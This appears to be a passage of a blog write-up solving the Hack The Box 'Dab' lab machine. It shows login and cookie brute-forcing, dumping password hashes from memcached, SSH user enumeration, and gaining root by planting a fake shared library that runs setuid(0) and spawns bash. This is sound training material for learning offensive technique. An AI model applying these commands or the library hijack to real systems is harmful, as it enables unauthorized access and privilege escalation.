+<h3 id="http-port-80">HTTP port 80</h3>
+<h4 id="lets-enumerate-the-first-port-and-see-what-we-can-get">Let’s enumerate the first port and see what we can get.</h4>
+<h4 id="the-most-common-credentials-adminadmin-didnt-work-and-we-get-error-login-failed">The most common credentials <code class="highlighter-rouge">admin:admin</code> didn’t work and we get <code class="highlighter-rouge">Error: Login failed</code></h4>
+<p><img src="/images/hackthebox/dab/10.png" alt="" /></p>
+<h4 id="if-we-intercept-the-request-with-burp-we-will-see-that-the-login-process-is-being-handled-through-a-post-request-with-the-parameters-username-and-password">If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters <code class="highlighter-rouge">username</code> and <code class="highlighter-rouge">password</code></h4>
+<p><img src="/images/hackthebox/dab/11.png" alt="" /></p>
+<h4 id="at-this-point-we-can-bruteforce-passwords-with-hydra--but-instead-of-that-i-just-used-zap-fuzzer--you-can-also-use-burp-intruder-but-its-very-slow-in-the-community-version">At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="fuzzing-with-zap">Fuzzing with ZAP</h3>
+<h4 id="first-thing-to-mention-is-the-wordlist--because-we-are-bruteforcing-remotely-its-better-to-use-a-small-wordlist-so-we-wont-use-rockyou-here-i-used-darkweb2017-top10000txt-from-seclists">First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt">darkweb2017-top10000.txt</a> from <a href="https://github.com/danielmiessler/SecLists">Seclists</a></h4>
+<h4 id="lets-start-zap-and-intercept-the-request-again">Let’s start zap and intercept the request again.</h4>
+<p><img src="/images/hackthebox/dab/12.png" alt="" /></p>
+<h4 id="then-right-click--attack--fuzzer--after-that-we-highlight-the-place-we-want-to-fuzz--that-will-be-the-password-parameter-value">Then right click –&gt; attack –&gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value.</h4>
+<p><img src="/images/hackthebox/dab/13.png" alt="" /></p>
+<h4 id="add--add-then-we-paste-the-wordlist-contents">Add –&gt; Add then we paste the wordlist contents.</h4>
+<p><img src="/images/hackthebox/dab/14.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/15.png" alt="" /></p>
+<h4 id="all-the-responses-will-be-200-and-542-bytes--except-one-response-302-and-209-bytes--for-the-value-password1-so-thats-the-password">all the responses will be <code class="highlighter-rouge">200</code> and 542 bytes , except one response <code class="highlighter-rouge">302</code> and 209 bytes , for the value <code class="highlighter-rouge">Password1</code> so that’s the password.</h4>
+<p><img src="/images/hackthebox/dab/16.png" alt="" /></p>
+<h4 id="and-we-get-it-in--but-">And we get it in , but …</h4>
+<p><img src="/images/hackthebox/dab/17.png" alt="" /></p>
+<h4 id="nothing-interesting--was-this-port-important--correct-me-if-im-wrong">Nothing interesting , was this port important ? correct me if i’m wrong.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="http-port-8080">HTTP port 8080</h3>
+<h4 id="moving-on-to-the-next-http-port--lets-intercept-the-request-with-burp-and-see-what-can-we-do-with-that-password-authentication-cookie">Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie.</h4>
+<p><img src="/images/hackthebox/dab/18.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/19.png" alt="" /></p>
+<h4 id="lets-add-a-cookie-and-name-it-password--value-can-be-anything-were-just-testing">Let’s add a cookie and name it password , value can be anything we’re just testing</h4>
+<p><img src="/images/hackthebox/dab/20.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/21.png" alt="" /></p>
+<h4 id="we-got-another-message--access-denied-password-authentication-cookie-incorrect">We got another message : <code class="highlighter-rouge">Access denied: password authentication cookie incorrect</code></h4>
+<h4 id="so-we-just-need-to-get-the-right-value-of-the-cookie-and-we-will-get-in">So we just need to get the right value of the cookie and we will get in.</h4>
+<h4 id="we-will-use-wfuzz-to-fuzz-the-cookie">We will use wfuzz to fuzz the cookie</h4>
+<p><code class="highlighter-rouge">wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ</code></p>
+<h4 id="then-we-will-terminate-it-immediately-and-look-how-can-we-filter-the-output">Then we will terminate it immediately and look how can we filter the output</h4>
+<p><img src="/images/hackthebox/dab/22.png" alt="" /></p>
+<h4 id="all-the-responses-has-324-chars-so-we-will-add---hh-324-and-this-will-not-show-us-any-response-with-324-chars">All the responses has <code class="highlighter-rouge">324 chars</code> so we will add <code class="highlighter-rouge">--hh 324</code> and this will not show us any response with 324 chars</h4>
+<p><code class="highlighter-rouge">wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324</code>
+<img src="/images/hackthebox/dab/23.png" alt="" /></p>
+<h4 id="secret-gave-us-a-response-of-540--lets-try-in-burp"><code class="highlighter-rouge">secret</code> gave us a response of 540 , let’s try in burp</h4>
+<p><img src="/images/hackthebox/dab/24.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/25.png" alt="" /></p>
+<h4 id="next-step-is-to-add-the-cookie--you-can-use-any-cookie-editor-after-that-we-get-this-page">next step is to add the cookie , you can use any cookie editor. after that we get this page.</h4>
+<p><img src="/images/hackthebox/dab/26.png" alt="" /></p>
+<h4 id="finally-we-got-something">Finally we got something</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="memcached">memcached</h3>
+<h4 id="the-very-first-thing-we-see-is--status-of-cache-engine-online">The very first thing we see is : “Status of cache engine: Online”</h4>
+<h4 id="cache-engine--after-some-googling-we-will-find-a-software-called-memcached">cache engine ? after some googling we will find a software called memcached</h4>
+<h4 id="httpsdownloadsmysqlcomdocsmysql-memcached-ena4pdf"><a href="https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf">https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf</a></h4>
+<blockquote>
+  <p>memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects.
+ -page 1</p>
+</blockquote>
+
+<p><br />
+<br /></p>
+
+<blockquote>
+  <p>By default, memcached uses the following settings:
+•  Memory allocation of 64MB
+•  Listens for connections on all network interfaces, using port 11211
+•  Supports a maximum of 1024 simultaneous connections
+ -page 5</p>
+</blockquote>
+
+<p><br />
+<br /></p>
+<h4 id="so-we-know-that-memcached-runs-on-port-11211--lets-try-any-port-to-test">So we know that memcached runs on port 11211 , let’s try any port to test</h4>
+<p><img src="/images/hackthebox/dab/27.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/28.png" alt="" /></p>
+<h4 id="we-get-an-internal-server-error">We get an internal server error</h4>
+<h4 id="now-lets-try-port-11211">Now let’s try port 11211</h4>
+<p><img src="/images/hackthebox/dab/29.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/30.png" alt="" /></p>
+<h4 id="we-get-output--error-because-we-didnt-send-a-valid-command--but-thats-a-confirmation-that-the-port-is-right">We get <code class="highlighter-rouge">output : ERROR</code> because we didn’t send a valid command , but that’s a confirmation that the port is right.</h4>
+<h4 id="now-we-need-to-know-what-to-put-in-line-to-send">Now we need to know what to put in “line to send”</h4>
+<h4 id="by-looking-at-this-cheat-sheet--the-first-command-we-see-is-get-which-reads-a-value--first-time-i-did-this-box-i-guessed-it--just-typed-get-users-and-it-worked-but-the-right-way-to-do-it-is-to-query-the-memory-statistics-with-stats-slabs-as-mentioned-in-the-cheat-sheet">By looking at this <a href="https://lzone.de/cheat-sheet/memcached">cheat sheet</a> , the first command we see is <code class="highlighter-rouge">get</code> which reads a value , first time i did this box i guessed it , just typed <code class="highlighter-rouge">get users</code> and it worked but the right way to do it is to query the memory statistics with <code class="highlighter-rouge">stats slabs</code> (as mentioned in the cheat sheet)</h4>
+<p><img src="/images/hackthebox/dab/31.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/32.png" alt="" /></p>
+<h4 id="full-output-">Full output :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>STAT 1:chunk_size 96
+STAT 1:chunks_per_page 10922
+STAT 1:total_pages 1
+STAT 1:total_chunks 10922
+STAT 1:used_chunks 0
+STAT 1:free_chunks 10922
+STAT 1:free_chunks_end 0
+STAT 1:mem_requested 0
+STAT 1:get_hits 0
+STAT 1:cmd_set 0
+STAT 1:delete_hits 0
+STAT 1:incr_hits 0
+STAT 1:decr_hits 0
+STAT 1:cas_hits 0
+STAT 1:cas_badval 0
+STAT 1:touch_hits 0
+STAT 16:chunk_size 2904
+STAT 16:chunks_per_page 361
+STAT 16:total_pages 1
+STAT 16:total_chunks 361
+STAT 16:used_chunks 1
+STAT 16:free_chunks 360
+STAT 16:free_chunks_end 0
+STAT 16:mem_requested 2880
+STAT 16:get_hits 0
+STAT 16:cmd_set 2
+STAT 16:delete_hits 0
+STAT 16:incr_hits 0
+STAT 16:decr_hits 0
+STAT 16:cas_hits 0
+STAT 16:cas_badval 0
+STAT 16:touch_hits 0
+STAT 26:chunk_size 27120
+STAT 26:chunks_per_page 38
+STAT 26:total_pages 1
+STAT 26:total_chunks 38
+STAT 26:used_chunks 1
+STAT 26:free_chunks 37
+STAT 26:free_chunks_end 0
+STAT 26:mem_requested 24699
+STAT 26:get_hits 440
+STAT 26:cmd_set 7
+STAT 26:delete_hits 0
+STAT 26:incr_hits 0
+STAT 26:decr_hits 0
+STAT 26:cas_hits 0
+STAT 26:cas_badval 0
+STAT 26:touch_hits 0
+STAT active_slabs 3
+STAT total_malloced 3127416
+END
+
+</code></pre></div></div>
+<h4 id="by-looking-at-the-slab-with-id-26-we-see-that-the-chunk-size-of-it-is-27120--lets-dump-the-keys-for-this-slab">By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab</h4>
+<p><code class="highlighter-rouge">stats cachedump 26 0</code></p>
+<h4 id="0-for-no-result-limit">0 for no result limit</h4>
+<p><img src="/images/hackthebox/dab/33.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/34.png" alt="" /></p>
+<h4 id="we-get-item-users">We get ITEM users</h4>
+<h4 id="so-we-do-get-users--however-you-can-just-guess-it-like-i-said-we-get-a-huge-json-output-of-usernames-and-password-hashes">So we do <code class="highlighter-rouge">get users</code> , however you can just guess it like I said. We get a huge json output of usernames and password hashes.</h4>
+<p><img src="/images/hackthebox/dab/35.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/dab/36.png" alt="" /></p>
+<hr />
+
+<h3 id="ssh-enumeration-and-getting-user">SSH enumeration and getting user</h3>
+<h4 id="lets-copy-that-output-and-save-it-on-our-box-i-saved-it-in-a-file-and-called-it-userstxt">Let’s copy that output and save it on our box. I saved it in a file and called it users.txt</h4>
+<p><code class="highlighter-rouge">cat users.txt</code>
+<img src="/images/hackthebox/dab/37.png" alt="" /></p>
+<h4 id="and-its-a-lot-of-unorganized-data--3-or-more-pages-like-this">And it’s a lot of unorganized data , 3 or more pages like this.</h4>
+<h4 id="we-will-use-a-python-module-called-jsontool-to-make-get-a-more-clear-output">we will use a python module called json.tool to make get a more clear output</h4>
+<p><code class="highlighter-rouge">cat users.txt | python -m json.tool &gt; users2.txt</code>
+<br />
+<br />
+<code class="highlighter-rouge">cat users2.txt</code>
+<img src="/images/hackthebox/dab/38.png" alt="" /></p>
+<h4 id="and-its-nice-now-lets-make-a-seperate-file-for-users-to-use-them-as-a-list-to-bruteforce-ssh--and-another-seperate-file-for-hashes-to-crack-them">And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them.</h4>
+<p><code class="highlighter-rouge">cat users2.txt | cut -d ":" -f 1 | cut -d '"' -f 2 &gt; usernames.txt</code>
+<br />
+<br />
+<code class="highlighter-rouge">cat users2.txt | cut -d ":" -f 2 | cut -d '"' -f 2 &gt; hashes.txt</code>
+<img src="/images/hackthebox/dab/39.png" alt="" /></p>
+<h4 id="to-bruteforce-ssh-we-will-use-a-metasploit-module-called-ssh_enumusers">To bruteforce ssh we will use a metasploit module called <code class="highlighter-rouge">ssh_enumusers</code></h4>
+<p><code class="highlighter-rouge">msfconsole</code>
+<br />
+<br />
+<code class="highlighter-rouge">use auxiliary/scanner/ssh/ssh_enumusers</code>
+<br />
+<br />
+<code class="highlighter-rouge">set RHOSTS dab.htb</code>
+<br />
+<br />
+<code class="highlighter-rouge">set USER_FILE usernames.txt</code>
+<br />
+<br />
+<code class="highlighter-rouge">set THREADS 20</code>
+<img src="/images/hackthebox/dab/40.png" alt="" /></p>
+<h4 id="it-will-run-for-a-while--then-it-will-tell-us-that-it-found-the-user-genevieve">It will run for a while , then it will tell us that it found the user <code class="highlighter-rouge">genevieve</code></h4>
+<p><img src="/images/hackthebox/dab/41.png" alt="" /></p>
+<h4 id="now-we-need-to-get-the-password-of-that-user-you-can-use-john--hashcat-or-online-crackers--however-i-have-already-cracked-them-and-only-few-ones-are-crackable-">now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable :</h4>
+<p><img src="/images/hackthebox/dab/42.png" alt="" /></p>
+<h4 id="now-we-need-to-know-which-one-of-these-passwords-is-genevieves-password--so-we-will-grep-for-genevieve-in-users2txt-then-we-will-grep-for-the-hash-in-cracked-hashestxt">Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in <code class="highlighter-rouge">users2.txt</code> then we will grep for the hash in <code class="highlighter-rouge">cracked-hashes.txt</code></h4>
+<p><img src="/images/hackthebox/dab/43.png" alt="" /></p>
+<h4 id="and-finally-we-have-valid-credentials-genevieveprincess1--lets-ssh">And finally we have valid credentials <code class="highlighter-rouge">genevieve:Princess1</code> , let’s ssh</h4>
+<p><img src="/images/hackthebox/dab/44.png" alt="" /></p>
+<h4 id="finally--we-owned-user-">Finally , we owned user !</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="more-enumeration">More enumeration</h3>
+<h4 id="we-have-a-password--lets-try-sudo--l--and-we-see-that-we-can-run-this-binary-as-root-usrbintry_harder--and-as-the-name-said--we-should-really-try-harder">We have a password , let’s try <code class="highlighter-rouge">sudo -l</code> , and we see that we can run this binary as root <code class="highlighter-rouge">/usr/bin/try_harder</code> , and as the name said … we should really try harder.</h4>
+<p><img src="/images/hackthebox/dab/45.png" alt="" /></p>
+<h4 id="it-gets-us-a-root-shell-then-immediately-dies-after-the-first-command-we-got-trolled-again-d">It gets us a root shell then immediately dies after the first command. We got trolled again :D</h4>
+<h4 id="find---perm--4000-to-search-for-suid-binaries-and-we-see-something-unusual"><code class="highlighter-rouge">find / -perm -4000</code> to search for suid binaries and we see something unusual.</h4>
+<p><img src="/images/hackthebox/dab/46.png" alt="" /></p>
+<h4 id="a-binary-called-myexec-has-suid-permissions-lets-see-whats-that">A binary called <code class="highlighter-rouge">myexec</code> has suid permissions. Let’s see what’s that.</h4>
+<p><img src="/images/hackthebox/dab/47.png" alt="" /></p>
+<h4 id="it-asks-for-a-password-and-of-course-test-is-refused--we-need-to-reverse-engineer-this-binary-to-find-the-password">It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="getting-the-password">Getting the password</h3>
+<h4 id="scp-genevievedabhtbusrbinmyexec-rootdesktophtbboxesdab-to-download-the-file-on-our-box"><code class="highlighter-rouge">scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab</code> to download the file on our box</h4>
+<p><img src="/images/hackthebox/dab/48.png" alt="" /></p>
+<h4 id="then-we-will-use-radare2">Then we will use radare2</h4>
+<p><code class="highlighter-rouge">radare2 myexec</code>
+<br />
+<br />
+<code class="highlighter-rouge">aaa</code>
+<br />
+<br />
+<code class="highlighter-rouge">pdf @ main</code>
+<img src="/images/hackthebox/dab/49.png" alt="" /></p>
+<h4 id="the-password-is-s3cur3l0g1n--lets-get-back-to-the-box-and-try-it">The password is <code class="highlighter-rouge">s3cur3l0g1n</code> , let’s get back to the box and try it</h4>
+<p><img src="/images/hackthebox/dab/50.png" alt="" /></p>
+<h4 id="and-we-get">And we get:</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password is correct 
+seclogin() called
+TODO: Placeholder for now, function not implemented yet
+</code></pre></div></div>
+<h4 id="so-what-can-we-do-now-">so what can we do now ?</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="hijacking-dynamically-linked-shared-object-library-and-getting-root">Hijacking dynamically linked shared object library and getting root</h3>
+<h4 id="if-we-run-ldd-list-dynamic-dependencies-against-that-binary-we-see-libsecloginso">If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so</h4>
+<p><img src="/images/hackthebox/dab/51.png" alt="" /></p>
+<h4 id="and-we-saw-earlier-when-we-executed-the-binary--seclogin-called">and we saw earlier when we executed the binary : <code class="highlighter-rouge">seclogin() called</code></h4>
+<h4 id="so-theoretically--if-we-can-replace-libsecloginso-with-another-one-and-link-to-it--the-binary-will-execute-it-as-root-lets-test-that">So theoretically , if we can replace <code class="highlighter-rouge">libseclogin.so</code> with another one and link to it , the binary will execute it as root. let’s test that.</h4>
+<h4 id="we-will-create-a-directory-in-homegenevieve-and-call-it-exploit">We will create a directory in <code class="highlighter-rouge">/home/genevieve/</code> and call it <code class="highlighter-rouge">.exploit</code></h4>
+<h4 id="then-we-will-write-a-small-c-program-that-spawns-bash">Then we will write a small c program that spawns bash.</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+
+seclogin() {
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+</code></pre></div></div>
+<p><img src="/images/hackthebox/dab/52.png" alt="" /></p>
+<h4 id="after-that-we-will-compile-it">After that we will compile it</h4>
+<p><code class="highlighter-rouge">gcc -fPIC -shared -o libseclogin.so exploit.c</code></p>
+<h4 id="now-our-fake-libsecloginso-is-ready--we-need-to-make-the-system-point-to-our-path-homegenevieveexploitlibsecloginso-instead-of-usrliblibsecloginso">Now our fake <code class="highlighter-rouge">libseclogin.so</code> is ready , we need to make the system point to our path <code class="highlighter-rouge">/home/genevieve/.exploit/libseclogin.so</code> instead of <code class="highlighter-rouge">/usr/lib/libseclogin.so</code></h4>
+<h4 id="we-will-cd-to-etcldsoconfd--and-create-a-conf-file-and-put-our-path-in-it">We will <code class="highlighter-rouge">cd</code> to <code class="highlighter-rouge">/etc/ld.so.conf.d</code> , and create a <code class="highlighter-rouge">.conf</code> file and put our path in it.</h4>
+<p><img src="/images/hackthebox/dab/53.png" alt="" /></p>
+<h4 id="then-to-activate-that-path-we-will-execute-this-command-ldconfig">Then to activate that path we will execute this command <code class="highlighter-rouge">ldconfig</code></h4>
+<h4 id="this-page-helped-a-lot"><a href="https://www.cyberciti.biz/faq/linux-setting-changing-library-path/">This page</a> helped a lot.</h4>
+<h4 id="lets-do-ldd-again">Let’s do <code class="highlighter-rouge">ldd</code> again:</h4>
+<p><img src="/images/hackthebox/dab/54.png" alt="" /></p>
+<h4 id="the-path-changed-and-pointed-to-our-fake-library">The path changed and pointed to our fake library.</h4>
+<h4 id="lets-own-root">Let’s own root.</h4>
+<p><code class="highlighter-rouge">./myexec</code>
+<img src="/images/hackthebox/dab/55.png" alt="" /></p>
+<h4 id="and-we-owned-root">And we owned root.</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br />
+<br /></p>
+<h4 id="previous-hack-the-box-write-up--hack-the-box---secnotes">previous Hack The Box write-up : <a href="/hack-the-box/secnotes/">Hack The Box - Secnotes</a></h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/dab/" hidden></a>
+</article>
+
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
